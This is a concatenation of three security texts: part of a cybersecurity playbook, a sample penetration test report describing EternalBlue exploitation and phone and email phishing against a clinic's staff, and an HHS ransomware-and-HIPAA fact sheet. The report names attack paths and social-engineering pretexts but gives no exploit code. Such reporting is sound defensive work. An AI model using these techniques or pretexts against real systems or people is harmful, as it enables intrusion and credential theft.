This is often most easily done with a port-forwarding firewall responding for the server, whether a server exists for that IP address or not. That technique makes a TCP port scan worthless. Of course, this will not stop an advanced attacker with access to better tools, but that’s what your zone defense is for. Changing your defaults is how you make the pool of possibly successful attackers much smaller. 5. Know what normal looks like. The way you do that is by knowing and understanding your employees, your vendors, your routines, your operating hours, and your policies. For example, if you know that no Microsoft Security center should be calling you to allow them to remotely inspect your system for malicious activity because you never paid for such a service then you’ll recognize it as a social engineering or phishing attack and will be prepared to stop it quickly. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 2: THE GAME PLAN 18 6. Make your users part of the solution. By making sure all your employees are aware of what’s normal, you can prevent a majority or fraud and phishing attacks. Employees who are aware of routines will notice quickly when a customer sends an email rather then calls. Changes in routine are a good indicator of possible attacks and employees are the first line of defense by reporting their suspicions. Making it routine for employees to escalate and document changes in processes can help create a forensic trail. Later, this can be correlated with patterns on your network. You should also get in the habit of proactively talking to employees and asking how things are running. Complaints such as a noisy hard drive, a slow system, or strange messages can then be immediately investigated. If you are prepared to perform quick recoveries, a system that is acting suspicious can be quickly wiped and reinstalled. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPart 3: Looking Downfield Despite the sports analogy, let’s be clear, cybersecurity isn’t something you dabble in. There’s no bush league cybersecurity. It’s not a game. Losers are real victims who incur real and sometimes catastrophic losses. Even winning is just a fleeting moment that is gone as quickly as it came. Cybersecurity is hard because we don’t know all of the possible vulnerabilities we have or all of the possible threats there may be. Even if we could, they change too frequently for us to maintain specific defenses. That’s because the environment we work in is changing all the time. New technologies, new business models, new services, and new communication channels make it extremely difficult to secure it all. Furthermore, this competition against attackers will last indefinitely.",

New technologies, new business models, new services, and new communication channels make it extremely difficult to secure it all. Furthermore, this competition against attackers will last indefinitely. That means your overall strategy has to be winning not just this season but every season after that. To do that you need to keep your players in shape, steadily improve your equipment, maintain a healthy environment, and employ the right tactics to stay in the game. In this section, we’ll cover how. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 3: LOOKING DOWNFIELD 20 Training All employees need to understand how cybersecurity affects their personal day-to-day role in the company, and they need to be trained in situational awareness both on and off the computer. \u0001 Teach all employees how they can be manipulated and fooled both in person and online. \u0001 There’s an infinite number of variations that an attack can take but a finite number of ways a person is vulnerable to fraud and manipulation. Rather than expect employees to be able to identify all manner of constantly shifting threats, instead teach them how to react securely when one of their vulnerabilities is probed (ex: when they’re asked for sensitive information). \u0001 Make it easy for employees to talk about their security or privacy concerns. \u0001 Employees are a company’s best anomaly detection engine. Make sure they will be able to voice their doubts and unusual activity before those concerns grow into big problems. \u0001 Really know your systems. \u0001 Anyone working in IT or cybersecurity should be well versed in how all of the current software and systems work inside the organization. It’s not enough to be certified or experienced in the brand of technology. You have to know how it works in your organization. You can’t secure anything if you don’t know what it does and how it works in your environment. Bring in a coach that will teach you and others security in the context of your operations. \u0001 Understand how to apply the basics. \u0001 All cybersecurity personnel should be well versed in operational security fundamentals as outlined in the OSSTMM which they can apply anywhere from physical to cyber anything. It’s not enough for them to say they read it, have them map your business processes into its controls and limitations as shown in the OSSTMM to see exactly how big your attack surface is.

To stay above hostile waters you need to train regularly on how to react when things go wrong.

Include all new hires in the drills from their first day. \u0001 Get employees used to dealing with attacks. \u0001 Plan regular security exercises designed to manipulate employees such as mock phishing attacks, social engineering in person and on the phone, and fake malware activity. \u0001 Give mandatory security challenges and puzzles. \u0001 These should take no more than a couple minutes to complete and are designed to be done without taking employees completely out of their day-to-day tasks. This trains employees to think security while doing their normal activities since nobody has the luxury to stop working during real attacks. Equipment In many sports, being the better athlete doesn’t guarantee a win on its own. The difference between first and second place can often come down to the equipment. New materials, new technology, and new designs can give you a critical advantage. \u0001 Make the most of your tech. \u0001 In cybersecurity, having better routers increases response times, better processors allow for stronger encryption protocols, and more elastic monitoring solutions reduce the need to spread out resources. \u0001 Consider the cloud. \u0001 Cloud-based services can provide you with additional functionality you don’t have to build or manage on your own. There’s a trade-off in terms of control and self-sufficiency, of course, but the added capabilities can allow you to do more with less. \u0001 Even when you can’t allocate resources on new equipment, you need to maintain the old. \u0001 Sometimes just upgrading components like RAM and hard disks is enough to make a difference. \u0001 Keep your systems running lean. \u0001 Stick to necessary software as much as possible, minimizing the memory resident and memory-hungry software that can slowly grind a system to a halt.

What they all have in common is that they’ve honed their game to adapt to that environment and they’ve cultivated a home field advantage by learning how to outcompete others on it accordingly. You need to do the same by getting to know your own environment by actively maintaining it and understanding even the littlest changes. \u0001 Know what “normal” looks like. \u0001 Make a routine of examining the protocols on the network, the systems that interact with each other, the ways the employees use their desktops, and how mobile devices operate in this environment. Fire up a packet sniffer and watch live traffic in different segments. Make sure you know what it all is and whether it should even be there.",

Fire up a packet sniffer and watch live traffic in different segments. Make sure you know what it all is and whether it should even be there. If you can get a professional tool for constantly monitoring traffic, like a SIEM, even better. Then track down those anomalies. \u0001 Remember: Not all software needs to be updated. \u0001 You should always update if a security patch is necessary and you have no other means of controlling the vulnerability. However, that requires you have the people and time to investigate that. If the updates are for new functionality only, on the other hand, consider whether you really need this new functionality. Many a process has been broken and many a file has been lost because an application or system update made changes you didn’t need or anticipate. As any coach will tell you, if it’s not broken, don’t fix it. So have a process in place to pick and choose which updates get installed. \u0001 Make rounds and talk to employees. \u0001 Get to know what they need to do their jobs, how they interact with third party vendor services, and what software they use regularly. People develop routines and habits at work. They are your best source for knowing when something outside your basic control like cloud services and vendor extranets are not behaving like normal. Forget Strategy, Choose Your Tactics A strategy is an integral part of any modern business plan. So what exactly is a cybersecurity strategy? A cybersecurity strategy is a plan with a set of goals and objectives to achieve cybersecurity as a result. People who are into selling cybersecurity strategies like to say it also includes specifics on tools and metrics. But that’s really just a trick of adding tactics to the strategy so it doesn’t sound so useless. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 3: LOOKING DOWNFIELD 23 Yes, useless. Fun fact for you — a cybersecurity strategy is useless. The truth is if you don’t have one for your business it’s because you’ve inherently got one already. You’ve never bothered to formally document it because it’s so obvious. Like how you don’t have a formal not dying strategy. If you were to have a formal cybersecurity strategy it would likely say you don’t want threats of any sort affecting your assets of any sort now or in the future. Which is obvious. So if it’s useless, why is there such a focus on a cybersecurity strategy? Because tactics are hard. It’s easier (and safer) to make a cybersecurity strategy sound like something important despite meaning nothing than it is to choose and implement tactics that work. You look better longer, too, because whereas a cybersecurity strategy can go on meaning nothing a really long time tactics that mean nothing get noticed right away. Cybersecurity tactics, meanwhile, are where the rubber meets",

You look better longer, too, because whereas a cybersecurity strategy can go on meaning nothing a really long time tactics that mean nothing get noticed right away. Cybersecurity tactics, meanwhile, are where the rubber meets the road. They are the bat striking the ball. They are literally the packets smacking the server. They are the way you “do the thing you do to the things you have” to achieve cybersecurity. And that’s hard to plan out. That said, here are a few steps to point you in the right direction: \u0001 Draw out the interactions and the separations between your systems. \u0001 This should be based on the packet activity you find on the network. It’s like making a hybrid physical and logical network map with arrows of interactions based on protocol activity. Determine how anything that should be separated or controlled. Voila, that’s you applying tactics! \u0001 List all of your network processes. \u0001 This includes server backups, server administration, remote desktop support services, etc. Know exactly what systems and people they can interact with, then determine what they should be interacting with. How you control that authorization is you applying tactics. \u0001 Do the same for wireless, physical room and asset access, and telephone systems. \u0001 Determine which tactics you need to apply to assure control. \u0001 Now take a step back. \u0001 Make sure that all of the tactics you chose fit with the overall company strategy and resources and that workflow is not hampered. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 3: LOOKING DOWNFIELD 24 Learn to Work with Non-Technical Colleagues Humans are social animals. The majority of us like being liked, like belonging to a group or a team, like standing up for a cause, and like being part of a community. Or even if we don’t “like” it doesn’t mean we want to be pushed out of it, either. The problem is just because we like it doesn’t mean we’re good at it. A lack of communication with the people holding the resources will greatly affect your ability to build the security that’s needed. Here are some tips for making communication run smoother: \u0001 Don’t assume because it makes sense to you that it makes sense to everyone. \u0001 It’s normal for people not to like change. Therefore you need to consider this hurdle anytime you’re proposing change and prepare for it by showing that change is the new normal. After all, the criminal hackers entering organizations like yours have had plenty of success, and they change tools and techniques all the time. \u0001 Communicate with your coworkers or your boss according to their capabilities. \u0001 If they are tech savvy, don’t talk down to them. If they aren’t technical, don’t go to them with tech-heavy reasoning. \u0001 Think about the money before you talk. \u0001 Your company is in business to make money. Show value.

Provide ways to show that additional security can replace some of the things you are currently doing. Or if that’s not possible, show how various solutions can reduce downtime, add quality, or improve efficiency. \u0001 Don’t waste their time. \u0001 Don’t let them even feel for a moment that you’re wasting their time. That means being prepared and polished. \u0001 Never say, “I told you so.” \u0001 Don’t bring up that time your suggestion got ignored and something bad happened. Don’t make it seem like you did them a favor or that you expect something for your brilliance and insight. Start from zero each time. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 3: LOOKING DOWNFIELD 25 The Big Picture In cybersecurity, you’re dealing with conflicting information from authorities struggling themselves to understand what makes or defines “good” security. Some of the most common questions leave most security professionals simply guessing as to what’s the right answer: Is it more secure to harden servers or use a firewall? When do you need two-factor authentication? Which is better security, certificates or passwords? Do reverse proxies actually provide more security? That said, cybersecurity is also maturing as a field. Every year, there’s less misinformation and more and more people trying to come to terms with the fact that they were at least a little wrong last year. But humility is not for everyone, and security is a humbling experience for everyone. It’s like in sports how you can keep thinking it was a great game right up until the point when you wondering how you lost. Things don’t tend to just gradually grow bad — they suddenly do, surprisingly so, from one breath to the next, the same way you go from running like a gazelle to sliding across the ground with no idea why you fell. Luckily, the online cybersecurity community has more advice than you ever need — even if it does conflict a lot. And one of the great things about such a huge, helpful, self-interested community of humbled people is that they really want to help. But you need to be careful with that if you want to really set yourself up for long-term success. What happens is that by relying on the cybersecurity community for your answers you will ultimately get mostly the answers that allow the security community, especially vendors to profit. This skews the directions future security research takes. It skews the tools that security vendors make and sell. Most of all, it skews the knowledge you need to know in order to improve your own security. What you’ll eventually learn is that good security professionals tell you what you want to know. But great security professionals tell you what you need to",

What you’ll eventually learn is that good security professionals tell you what you want to know. But great security professionals tell you what you need to know. You’ll know when it’s the latter because it will frustrate you and seem like a pain in the ass and leave you wondering if you can’t just buy and install some product. You can. But without putting the work behind any product you install to make it fit your environment and your processes then you won’t fix the problem. More likely, you will create a set of new ones. The cybersecurity field hasn’t matured enough to know what’s right all the time. It has a problem of letting go of what isn’t working. It still tries to base success on effort rather than security. So the first thing you need to do to improve yourself is to stop repeating things like “Everyone gets hacked eventually” and “If a hacker really wants in they’ll get in” and “Security is a process.” Because if our humbling experiences have told us anything, it’s that security isn’t a slogan or a comforting phrase. It’s the toughest riddle you’ll ever have to solve before the Troll comes out from under the bridge and eats you. And every riddle has a different answer every time. It’s constantly changing based on the environment you’re in. THE OPEN SOURCE CYBERSECURITY PLAYBOOK\\nPART 3: LOOKING DOWNFIELD 26 So as you set out to win in the cybersecurity field remember that the security community is a resource and not an answer, just like Wikipedia is a resource and not a term paper. What you get from it will rarely fit your needs as-is. You still need to figure out how to answer your own riddle, and that takes knowing your environment, your employees, and how it all works together (aka the Big Picture). You need to know where the interactions are, what resources are being used and from where, as well as who has authorized access to what. And you need to do that constantly because every second, the riddle changes a little bit. Or else before you know it, it’s changed a lot and you’re not ready for what happens next.

The test was performed in accordance with PurpleSec Information Security Penetration Testing Method. PurpleSec’s Information Security Analyst (ISA) conducted all testing in coordination with CLIENTs Information Technology (IT) staff members to ensure safe, orderly, and complete testing within the approved scope. CLIENT’s information environment is protected by endpoint antivirus and administrative controls managed by an Active Directory. The environment contains numerous vulnerabilities, including some very serious security flaws such as EternalBlue which makes them susceptible to data breaches and system takeovers. Highly important files which contain HIPAA and payment information are easily accessible and very visible; putting the CLIENT at great risk to compliance violation and potentially subject to large fines and/or loss of business reputation. 1.2 High-Level Test Outcomes Internal penetration test: Intended to simulate the network-level actions of a malicious actor who gained a foothold within the internal network zone. Overall, CLIENT presents a high-risk attack surface with major critical vulnerabilities that allowed complete root access to multiple systems exist within CLIENT’s critical infrastructure. The EPO server and the Remote Desktop Server were both susceptible to EternalBlue; a shell was opened on both remotely by exploiting the SMBv1 vulnerability using a Publicly available exploit module which remotely attacked the spoolsv.exe service via port 445 (SMB). The Remote Desktop server contained numerous user files of CLIENT’s staff members. Traversing the user profile data revealed many files that contained private patient healthcare information including diagnostics, health insurance information, and transaction receipts. The ability to control the system as NT Authority makes data exfiltration trivial as any user specific permissions are not applied to NT Authority user. Two other systems had the SChannel (CVE-2014-6321) vulnerability which makes them susceptible to DoS via code over Schannel. A script can be written to exploit this vulnerability and cause the receiving system to open multiple threads and lockout the processor. This was not exploited as PurpleSec does not use DDOS in its testing. sales@purplesec.us 5\\nJANUARY 1, 2020 1.3 Overall Risk Rating",

Fig. 1-1: PurpleSec Risk Matrix 1.4 Prioritized Recommendations Based on the results achieved during the test project PurpleSec makes the following recommendations (presented by order of priority): • Patch critical systems (Microsoft Security Bulletin MS17-010 – Critical) • Run Vulnerability Scans on at least monthly basis (scan-patch-scan again) • Change passwords (10+ complex characters) on all systems that contain ePHI. • Social Engineering training for every employee. • Disable SMB and spoolsvc on McAfee server. sales@purplesec.us 6\\nJANUARY 1, 2020 2.0 Test Scope and Method 2.1 Extent of Testing Example Institute engaged PurpleSec to provide the following penetration testing services: • Network-level, technical penetration testing against hosts in the internal networks. • Network -level, technical penetration testing against internet facing hosts. • Social Engineering, phone phishing against CLIENT employees. • Social Engineering, email phishing against CLIENT employees. 2.2 Test Scope Summary The following information environment zones were included in the scope of the penetration test: • Internal Network: Example Institute’s general internal networks. The test was conducted in two phases: • Internal stage: Starting from the internal network zone. Intended to simulatethe network-level actions of a malicious actor who gained a foothold within the internal network zone. (Remainder of page left intentionally blank) sales@purplesec.us 7\\nJANUARY 1, 2020 3.0 Internal Phase 3.1 Phase Summary PurpleSec’s ISA conducted various reconnaissance and enumeration activities. Port and vulnerability scanning, as well as other reconnaissance activities revealed serious security holes. The most concerning vulnerabilities allow complete system takeover on important servers, most critically the McAfee Security server; compromise of which could allow a potential attacker to render the endpoint security for the entire internal network inoperable or ineffective. Once server compromise was achieved, directory traversal to search for important data was conducted. The analyst was able to identify many directories with private patient data and numerous other data that would fall under HIPAA and PCI compliance. 3.2 Actions Taken To determine and practically demonstrate the feasibility of expanding access given a foothold within the internal network, the ISA conducted the following activities: From Zone: Internal network Via: N/A To Zone: Internal network Method: Network-level penetration testing Current Zone Activities: The ISA used a SecureSensor deployed inside Example Institute’s facilities to conduct port, service, and vulnerability scanning as well as other reconnaissance techniques within Example Institute’s internal networks.

Microsoft Windows SMBv1 Multiple Vulnerabilities (ETERNALBLUE) CVE-2017-0143, CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, CVE-2017-0148 sales@purplesec.us 8\\nJANUARY 1, 2020 EternalBlue is an exploit developed by the NSA and leaked via ShadowBrokers in 2017. Recent similar “Eternal” exploits have been developed to attack systems from Windows Server 2000 up to the latest OS releases. EternalBlue gives the attacker complete root access to the target system via a buffer overflow when sending specially crafted SMB packets to the server. The overflow executes code in a target service such as spoolsv.exe. Once the remote shell is opened, the attacker has control of the system as “NT Authority” which is kernel access in Windows systems, allowing complete system takeover. The SMB SMBv1 vulnerability opens the system up to the possibility of Ransomware attacks such as WannaCry, which are delivered as payloads via EternalBlue type attacks. PurpleSec’s ISA was able to gain root access to the system <hostname> 192.168.1.235 and <hostname> 192.168.1.222 (McAfee Security Server) via CVE-2017- 144. The analyst attempted to connect to the remote system via the SMB port 445 and without any credentials as a reconnaissance step to validate whether the remote system was honoring SMB connection requests. Once the connection was validated, the analyst used publicly available tools to exploit the vulnerability. Prompt changes to C:\\windows\\system 32, indicating that a remote shell has been established at the root of the target OS. sales@purplesec.us 9\\nJANUARY 1, 2020 From here the analyst performs several directory traversals to move to the root drive and begin reconnaissance for critical files such as patient information, ePHI, PII, and payment information. Traversing user profile document folders revealed several folders with sensitive, confidential patient and hospital information. Due to attaining access as the NT Authority user, no permissions settings or passwords prevent access to any of the files on the system. User profiles contain various files that, if breached, could make Example Institute liable for fines. In addition to the noted HIPAA and ePHI files, a PFX certificate file was also located on the server. sales@purplesec.us 10\\nJANUARY 1, 2020 PFX Files are encrypted files which may contain data or be used as secret keys to access other encrypted data or systems.

There is further risk of privilege escalation because NT Authority user can promote any other users to Admin level access, including Domain Admin, if the target system is an Active Directory server or has rights to configure Domain settings remotely. The McAfee Security Server (192.168.1.222) was vulnerable to the same ETERNALBLUE exploit. As SMB and spoolsv.exe services were running on the McAfee server the attack was executed using the same method described above. Initially the shell failed to open, which is common with this exploit; a retry resulted in successful execution. sales@purplesec.us 11\\nJANUARY 1, 2020 SSL Version 2 and 3 Protocol Detected: A network reconnaissance scan detected multiple hosts with a vulnerable version of SSLv2 and SSLv3. The remote service accepts connections encrypted using SSL 2.0 and/or SSL 3.0. These versions of SSL are affected by several cryptographic flaws, including: - An insecure padding scheme with CBC ciphers. - Insecure session renegotiation and resumption schemes. An attacker can exploit these flaws to conduct man-in-the-middle attacks or to decrypt communications between the affected service and clients. Although SSL/TLS has a secure means for choosing the highest supported version of the protocol (so that these versions will be used only if the client or server support nothing better), many web browsers implement this in an unsafe way that allows an attacker to downgrade a connection (such as in POODLE). Therefore, it is recommended that these protocols be disabled entirely. NIST has determined that SSL 3.0 is no longer acceptable for secure communications.

Due to the nature of the testing, this exploit is out of scope for the exercise. Outsider Risk Rating: Insider Risk Rating: EXTREME Bottom Line: Nearly all CLIENT’s internal networks hosts appear to be properly patched and up-to- date. Attack vectors are available to an adversary who targeted CLIENT. Considering CLIENT’s lack of IT personnel or Security Engineer, an attacker could find success through Social Engineering or Physical attack methods due to the lack of training and resources found during this penetration testing. Recommendations: • Disable SMB on all systems where it is not required for business purposes. The service may be shut down via GPO on the domain, or through manual service disabling on local admin accounts. • Disable spoolsvc.exe and other non-essential processes on Critical Security Infrastructure such as the McAfee Security Server. Processes running increase the attack surface of the systems. Disabling these services can help harden the systems and create a smaller, more secure risk landscape. • Disable SSLv2 and SSLv3 on any system where legacy encryption is not necessary. Most applications use better encryption built-in but use SSL as a fallback option when needed for legacy support.

This is intended to simulate a malicious actor attempting to gain credentials and a foothold in the environment by a phone call. 10 phone contacts were made with 3 Full Breach’s with multiple (6) passwords given to the Social Engineer. One contact stated most of the systems use the same password for everyone. Nexus Point Activities: PurpleSec‘s Social Engineer called the numbers over a three-day period and spoke with CLIENT staff members. Each time a live staff member was reached, the Social Engineer claimed to be a technical support worker authorized to contact CLIENT’s personnel to provide critical support. If challenged, the Social Engineer would then drop Information Security Staff member names in a statement that they are working on their behalf. The Social Engineer’s program included the following activities: • Requesting that the user provide his/her domain username. • Feigning an attempt to perform a technical operation on the user’s behalf, and then requested that the user provide his/her domain password when the operation ‘failed.’ Three of the personnel engaged by the Social Engineer provided domain usernames or passwords. The passwords revealed were eight characters long with only alphanumeric characters. Cloud-based servers may be able to break these passwords within a manner of weeks or days depending on the resources allocated to password cracking efforts. PurpleSec recommends increased complexity and length.

A phishing template with appropriate signage and logos was created. Nexus Point Activities: PurpleSec’s Social Engineer sent a phishing e-mail to all the in-scope addresses. The e- mail originated from a spurious IT support company and claimed to be a legitimate technical support request authorized by CLIENT’s IT Department. The e-mail also requested that the user navigate to an PurpleSec-controlled Website and: • Provide his/her domain username, • Provide his/her e-mail address (in lieu of password), and • Download a benign executable file, • Run the executable locally on his/her workstation. Of the 175 email addresses tested, 13 users interacted with untrusted content (hyperlink) and 9 provided domain usernames/e-mail address. Figure 3.49 – Screenshot showing the email phishing results. Risk Rating: Medium Bottom Line: The response and click rates for CLIENT’s staff tested via email are just under 10% and should be considered a vulnerability for the organization. It should be noted that most malware needs only a single response, and full response from a user to username/password requests may lead to significant breaches. sales@purplesec.us 23\\nPEN TEST REPORT: EXAMPLE INSTITUTE JANUARY28,2019 Recommendations: • While click and interaction rates were calculated as Medium it is highly recommended that CLIENT engage in Cybersecurity awareness training immediately. 5.0 Conclusions 5.1 Most Likely Compromise Scenarios An attacker would most likely start an attack against CLEINT with social engineering techniques. (this is the most successful type of attack) and given that ETERNALBLUE is easily exploited, this is the most likely compromise of the entire system. Attacking the McAfee Security Server would be an ideal first target; once an attacker has attained root access to this system, they can disable all the security controls and systems in place, allowing for much more evasive traversal of the internal network, as well as potentially creating more targets without the hindrance of the security systems. From here, the ideal goals of an attacker would be data exfiltration of ePHI, Personally Identifiable Information (PII) and PCI data - for purposes of fraud, ransom, targeted phishing, sale, etc. - and any payment information that may be available for similar purposes. An adversary would attempt to access to the Domain Controllers to help facilitate network traversal and further compromise of security controls and monitoring systems. With Domain access, complete infrastructure compromise is likely; with this level of access an attacker presents numerous serious security risks to critical and confidential information systems.

With Domain access, complete infrastructure compromise is likely; with this level of access an attacker presents numerous serious security risks to critical and confidential information systems. Internet facing assets at CLIENT have little to no interactivity and so pose less of a threat to intrusion through these systems. However, the systems are vulnerable to Man-in-the-middle (MITM) type attacks which could be utilized by an attacker to gain access to private communications and potentially steal passwords to gain further access into the network. 5.2 Implications Based on the above testing activities, the average risk level across the board is EXTREME Complete system compromise is trivially achieved on critical security and file servers, systems that contain myriad important and confidential files which, if breached, can put CLIENT at great risk to large fines and significant business impact. Disable SMB on any system that does not require it for business functionality. Even with recent patches, Windows systems using SMB remain vulnerable to ETERNALBLUE type exploits so long as the service is running. System hardening needs to be implemented immediately to shrink the risk landscape of the infrastructure.

HIPAA data should be contained to ONLY systems that require access to the data; it is encouraged that these systems employ good data at rest encryption and least privilege access controls to prevent unauthorized access. Best practice is to centrally store these types of files on a managed, hardened network location, users should access the files only via network connectors in their in profiles with configured security permissions.

    "text": "U.S. DEPARTMENT OF HEALTH AND HUMAN SERVICES Office for Civil Rights FACT SHEET: Ransomware and HIPAA A recent U.S. Government interagency report indicates that, on average, there have been 4,000 daily ransomware attacks since early 2016 (a 300% increase over the 1,000 daily ransomware attacks reported in 2015).1 Ransomware exploits human and technical weaknesses to gain access to an organization’s technical infrastructure in order to deny the organization access to its own data by encrypting that data. However, there are measures known to be effective to prevent the introduction of ransomware and to recover from a ransomware attack. This document describes ransomware attack prevention and recovery from a healthcare sector perspective, including the role the Health Insurance Portability and Accountability Act (HIPAA) has in assisting HIPAA covered entities and business associates to prevent and recover from ransomware attacks, and how HIPAA breach notification processes should be managed in response to a ransomware attack. 1. What is ransomware? Ransomware is a type of malware (malicious software) distinct from other malware; its defining characteristic is that it attempts to deny access to a user’s data, usually by encrypting the data with a key known only to the hacker who deployed the malware, until a ransom is paid. After the user’s data is encrypted, the ransomware directs the user to pay the ransom to the hacker (usually in a cryptocurrency, such as Bitcoin) in order to receive a decryption key. However, hackers may deploy ransomware that also destroys or exfiltrates2 data, or ransomware in conjunction with other malware that does so. 2. Can HIPAA compliance help covered entities and business associates prevent infections of malware, including ransomware? Yes. The HIPAA Security Rule requires implementation of security measures that can help prevent the introduction of malware, including ransomware. Some of these required security measures include: • implementing a security management process, which includes conducting a risk analysis to identify threats and vulnerabilities to electronic protected health information (ePHI) and implementing security measures to mitigate or remediate those identified risks; • implementing procedures to guard against and detect malicious software; 1 United States Government Interagency Guidance Document, How to Protect Your Networks from Ransomware available at https://www.justice.gov/criminal-ccips/file/872771/download. 2 Exfiltration is “[t]he unauthorized transfer of information from an information system.” NIST SP 800-53 Rev. 4, Security and Privacy Controls for Federal Information Systems and Organizations. (April 2013). Available at http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-53r4.pdf.\\n• training users on malicious software protection so they can assist in detecting malicious software and know how to report such detections; and • implementing access controls to limit access to ePHI to only those persons or software programs requiring access. The Security Management Process standard of the Security Rule includes requirements for all covered entities and business associates to conduct an accurate and thorough risk analysis of the potential risks and vulnerabilities to the confidentiality, integrity, and availability of all of the ePHI the entities create, receive, maintain, or transmit and to implement security measures sufficient to reduce those identified risks and vulnerabilities to a reasonable",

It is expected that covered entities and business associates will use this process of risk analysis and risk management not only to satisfy the specific standards and implementation specifications of the Security Rule, but also when implementing security measures to reduce the particular risks and vulnerabilities to ePHI throughout an organization’s entire enterprise, identified as a result of an accurate and thorough risk analysis, to a reasonable and appropriate level. For example, although there is a not a Security Rule standard or implementation specification that specifically and expressly requires entities to update the firmware3 of network devices, entities, as part of their risk analysis and risk management process, should, as appropriate, identify and address the risks to ePHI of using networks devices running on obsolete firmware, especially when firmware updates are available to remediate known security vulnerabilities. In general, moreover, the Security Rule simply establishes a floor, or minimum requirements, for the security of ePHI; entities are permitted (and encouraged) to implement additional and/or more stringent security measures above what they determine to be required by Security Rule standards. 3. Can HIPAA compliance help covered entities and business associates recover from infections of malware, including ransomware? Yes. The HIPAA Security Rule requires covered entities and business associates to implement policies and procedures that can assist an entity in responding to and recovering from a ransomware attack. Because ransomware denies access to data, maintaining frequent backups and ensuring the ability to recover data from backups is crucial to recovering from a ransomware attack. Test restorations should be periodically conducted to verify the integrity of backed up data and provide confidence in an organization’s data restoration capabilities. Because some ransomware variants have been known to remove or otherwise disrupt online backups, entities should consider maintaining backups offline and unavailable from their networks. 3 Firmware refers to “[c]omputer programs and data stored in hardware... such that the programs and data cannot be dynamically written or modified during execution of the programs.” NIST SP 800-53 Rev. 4, Security and Privacy Controls for Federal Information Systems and Organizations.

Additional activities that must be included as part of an entity’s contingency plan include: disaster recovery planning, emergency operations planning, analyzing the criticality of applications and data to ensure all necessary applications and data are accounted for, and periodic testing of contingency plans to ensure organizational readiness to execute such plans and provide confidence they will be effective.

See 45 C.F.R. 164.308(a)(7). During the course of responding to a ransomware attack, an entity may find it necessary to activate its contingency or business continuity plans. Once activated, an entity will be able to continue its business operations while continuing to respond to and recover from a ransomware attack. Maintaining confidence in contingency plans and data recovery is critical for effective incident response, whether the incident is a ransomware attack or fire or natural disaster. Security incident procedures, including procedures for responding to and reporting security incidents, are also required by HIPAA. See 45 C.F.R. 164.308(a)(6). An entity’s security incident procedures should prepare it to respond to various types of security incidents, including ransomware attacks. Robust security incident procedures for responding to a ransomware attack should include processes to4: • detect and conduct an initial analysis of the ransomware; • contain the impact and propagation of the ransomware; • eradicate the instances of ransomware and mitigate or remediate vulnerabilities that permitted the ransomware attack and propagation; • recover from the ransomware attack by restoring data lost during the attack and returning to “business as usual” operations; and • conduct post-incident activities, which could include a deeper analysis of the evidence to determine if the entity has any regulatory, contractual or other obligations as a result of the incident (such as providing notification of a breach of protected health information), and incorporating any lessons learned into the overall security management process of the entity to improve incident response effectiveness for future security incidents. 4. How can covered entities or business associates detect if their computer systems are infected with ransomware? Unless ransomware is detected and propagation halted by an entity’s malicious software protection or other security measures, an entity would typically be alerted to the presence of ransomware only after the ransomware has encrypted the user’s data and alerted the user to its presence to demand payment. However, in some cases, an entity’s workforce may notice early indications of a ransomware attack that has evaded the entity’s security measures. HIPAA’s requirement that an entity’s workforce receive appropriate security training, including training for detecting and reporting instances of malicious 4 Adapted from NIST SP 800-61Rev. 2, Computer Security Incident Handling Guide. 3\\nsoftware, can thus assist entities in preparing their staff to detect and respond to ransomware. Indicators of a ransomware attack could include: • a user’s realization that a link that was clicked on, a file attachment opened, or a website visited may have been malicious in nature; • an increase in activity in the central processing unit (CPU) of a computer and disk activity for no apparent reason (due to the ransomware searching for, encrypting and removing data files); • an inability to access certain files as the ransomware encrypts, deletes and re-names and/or re- locates",

If an entity believes that a ransomware attack is underway, either because of indicators similar to those above or other methods of detection, the entity should immediately activate its security incident response plan, which should include measures to isolate the infected computer systems in order to halt propagation of the attack. Additionally, it is recommended that an entity infected with ransomware contact its local FBI or United States Secret Service field office. These agencies work with Federal, state, local and international partners to pursue cyber criminals globally and assist victims of cybercrime. 5. What should covered entities or business associates do if their computer systems are infected with ransomware? The presence of ransomware (or any malware) on a covered entity’s or business associate’s computer systems is a security incident under the HIPAA Security Rule. A security incident is defined as the attempted or successful unauthorized access, use, disclosure, modification, or destruction of information or interference with system operations in an information system. See the definition of security incident at 45 C.F.R. 164.304. Once the ransomware is detected, the covered entity or business associate must initiate its security incident and response and reporting procedures. See 45 C.F.R. 164.308(a)(6). HIPAA covered entities and business associates are required to develop and implement security incident procedures and response and reporting processes that they believe are reasonable and appropriate to respond to malware and other security incidents, including ransomware attacks. Entities seeking guidance regarding the implementation of security incident procedures may wish to review NIST SP 800- 61 Rev. 2, Computer Security Incident Handling Guide5 for additional information. An entity’s security incident response activities should begin with an initial analysis to: 5 Available at http://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf 4\\n• determine the scope of the incident to identify what networks, systems, or applications are affected; • determine the origination of the incident (who/what/where/when); • determine whether the incident is finished, is ongoing or has propagated additional incidents throughout the environment; and • determine how the incident occurred (e.g., tools and attack methods used, vulnerabilities exploited). These initial steps should assist the entity in prioritizing subsequent incident response activities and serve as a foundation for conducting a deeper analysis of the incident and its impact. Subsequent security incident response activities should include steps to: • contain the impact and propagation of the ransomware; • eradicate the instances of ransomware and mitigate or remediate vulnerabilities that permitted the ransomware attack and propagation; • recover from the ransomware attack by restoring data lost during the attack and returning",

